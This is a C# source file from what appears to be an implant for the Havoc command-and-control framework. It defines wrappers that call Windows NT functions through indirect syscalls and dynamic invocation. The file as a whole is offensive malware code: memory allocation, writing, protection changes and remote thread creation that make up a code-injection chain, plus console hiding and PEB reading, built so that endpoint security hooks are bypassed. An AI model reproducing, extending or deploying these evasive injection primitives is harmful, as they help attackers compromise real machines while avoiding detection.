using HavocImplant.NativeUtils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static HavocImplant.NativeUtils.Structs.Win32;

namespace HavocImplant.NativeUtils
{
    public class Wrappers
    {
        public static dll ntdll = globalDll.ntdll;
        public static dll kernel32 = globalDll.kernel32;
        public static dll user32 = globalDll.user32;
        public static dll kernelbase = globalDll.kernelbase;

        // idk why i rewrote this one
        public static IntPtr GetStdHandle(int nStdHandle)
        {
            IntPtr pInformation = IntPtr.Zero;
            object[] allocArgs = new object[] { (IntPtr)(-1), pInformation, IntPtr.Zero, (IntPtr)0x38, Enums.AllocationType.Commit | Enums.AllocationType.Reserve, Enums.MemoryProtection.ReadWrite };
            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", allocArgs);
            pInformation = (IntPtr)allocArgs[1];

            object[] queryArgs = new object[] { (IntPtr)(-1), 0, pInformation, (uint)Marshal.SizeOf(typeof(Structs.Win32.PROCESS_BASIC_INFORMATION)), IntPtr.Zero }; //class 0 = PBI
            ntdll.indirectSyscallInvoke<Delegates.NtQueryInformationProcess>("NtQueryInformationProcess", queryArgs);
            pInformation = (IntPtr)queryArgs[2];
            Structs.Win32.PROCESS_BASIC_INFORMATION pbi = (Structs.Win32.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pInformation, typeof(Structs.Win32.PROCESS_BASIC_INFORMATION));

            IntPtr pProccessParams = Marshal.ReadIntPtr(IntPtr.Add(pbi.PebAddress, 0x20)); // PEB addr is 0x20 into PBI

            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pInformation, (IntPtr)Marshal.SizeOf(pbi), (uint)0x8000 });

            switch (nStdHandle)
            {
                case Enums.STD_OUTPUT_HANDLE:
                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x28));
                case Enums.STD_ERROR_HANDLE:
                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x30));
            }
            return IntPtr.Zero;
        }
        // or this one
        public static bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)
        {
            object[] args = new object[] { IntPtr.Zero, IntPtr.Zero, lpPipeAttributes, nSize };
            bool retVal = (bool)kernel32.dynamicExecute<Delegates.CreatePipe>("CreatePipe", args);
            hReadPipe = (IntPtr)args[0];
            hWritePipe = (IntPtr)args[1];
            lpPipeAttributes = (SECURITY_ATTRIBUTES)args[2];
            return retVal;
        }
        public static bool SetStdHandle(int nStdHandle, IntPtr hHandle)
        {
            return (bool)kernel32.dynamicExecute<Delegates.SetStdHandle>("SetStdHandle", new object[] { nStdHandle, hHandle });
        }
        public static bool AllocConsole()
        {
            return (bool)kernel32.dynamicExecute<Delegates.AllocConsole>("AllocConsole", new object[] { });
        }
        public static IntPtr GetConsoleWindow()
        {
            return (IntPtr)kernel32.dynamicExecute<Delegates.GetConsoleWindow>("GetConsoleWindow", new object[] { });
        }
        public static bool HideWindow(IntPtr hWnd)
        {
            return (bool)user32.dynamicExecute<Delegates.ShowWindow>("ShowWindow", new object[] { hWnd, 0 });
        }
        public static bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
        {
            object[] args = new object[] { hFile, lpBuffer, nNumberOfBytesToRead, (uint)0, lpOverlapped };
            bool retVal = (bool)kernel32.dynamicExecute<Delegates.ReadFile>("ReadFile", args);
            lpBuffer = (byte[])args[1];
            lpNumberOfBytesRead = (uint)args[3];
            return retVal;
        }
        public static bool CloseHandle(IntPtr hObject)
        {
            return (bool)kernel32.dynamicExecute<Delegates.CloseHandle>("CloseHandle", new object[] { hObject });
        }
        public static uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
        {
            object[] argsNtAllocateVirtualMemory = { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory);
            BaseAddress = (IntPtr)argsNtAllocateVirtualMemory[1];
            RegionSize = (IntPtr)argsNtAllocateVirtualMemory[3];
            return ntstatus;
        }
        public static uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, IntPtr buffer, uint bufferLength, out UInt32 NumberOfBytesWritten)
        {
            object[] writeArgs = { processHandle, baseAddress, buffer, bufferLength, (uint)0 };
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", writeArgs);
            NumberOfBytesWritten = (uint)writeArgs[4];
            return ntstatus;

        }
        public static uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 FreeType)
        {
            object[] freeArgs = { ProcessHandle, BaseAddress, RegionSize, FreeType};
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", freeArgs);
            BaseAddress = (IntPtr)freeArgs[1];
            RegionSize = (IntPtr)freeArgs[2];
            return ntstatus;

        }
        public static uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect)
        {

            object[] protectArgs = { processHandle, baseAddress, regionSize, newProtect, (uint)0 };
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protectArgs);
            baseAddress = (IntPtr)protectArgs[1];
            regionSize = (IntPtr)protectArgs[2];
            oldProtect = (uint)protectArgs[4];
            return ntstatus;
        }
        public static uint NtCreateThreadEx(ref IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        { 
            object[] argsNtCreateThreadEx = { threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList };
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", argsNtCreateThreadEx);
            threadHandle = (IntPtr)argsNtCreateThreadEx[0];
            return ntstatus;
        }
        public static uint NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr Timeout)
        {
            return (uint)ntdll.indirectSyscallInvoke<Delegates.NtWaitForSingleObject>("NtWaitForSingleObject", new object[] { Handle, Alertable, Timeout });
        }
    }
}
